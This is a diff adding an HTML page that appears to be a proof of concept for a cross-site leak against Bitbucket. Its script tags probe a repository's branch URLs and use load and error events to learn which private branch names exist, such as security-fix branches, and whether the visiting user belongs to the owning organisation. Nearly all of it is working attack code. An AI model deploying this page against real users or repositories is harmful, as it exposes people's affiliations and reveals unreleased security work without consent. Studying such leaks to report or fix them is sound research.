@@ -1,0 +1,56 @@
+<html>
+    <head>
+        <Title>XS-leaks</Title>
+    </head>
+    <body>
+        <script>
+            function panik(url){
+            var img = document.createElement("img");
+            img.src = url;
+            var src = document.getElementById("header");
+            src.appendChild(img);
+        }
+        </script>
+        <script>
+            function leak_branch(branch_name){
+                url=`https://bitbucket.org/xs-leaks/leaking-branches/src/${branch_name}/`
+                var s = document.createElement('script');
+                s.src=url;
+                s.onload = function() { 
+                    document.getElementById("output_p").insertAdjacentHTML("afterend",branch_name+"<br>"); 
+                };
+
+                s.onerror = function(){
+                    document.getElementById("output_n").insertAdjacentHTML("afterend",branch_name+"<br>");
+                };
+
+                document.body.appendChild(s);
+            }
+            function xsleak(){
+                var branch=document.getElementById("branch").value.split(",");
+                console.log(branch)
+                for(var i=0;i<branch.length;i++){
+                    leak_branch(branch[i])
+                }
+                panik('panik.jpeg')
+            }
+        </script>
+        <center>
+            <h2>Leaking Branches Name</h2>
+            <div id="header"></div>
+            <h3>Branch found</h3>
+            <div id="output_p"></div>
+            <h3>Branches Not found</h3>
+            <div id="output_n"></div>
+            <br>
+            <br>
+        </center>
+        <center>
+            <label for="teams">Add Branch names sepeated by commas</label>
+            <input type="text" id="branch" placeholder="master,text,Security-update,log4j-fix,xss-fix,notfound,random">
+            <br>
+            <input type="button" value="Start" onclick="xsleak()">
+        </center>
+        <script src="https://bitbucket.org/xs-leaks/leaking-branches/" onload="alert('user is employee of xs-leaks')" onerror="alert('user is not an employee of xs-leaks')"></script>
+    </body>
+</html>
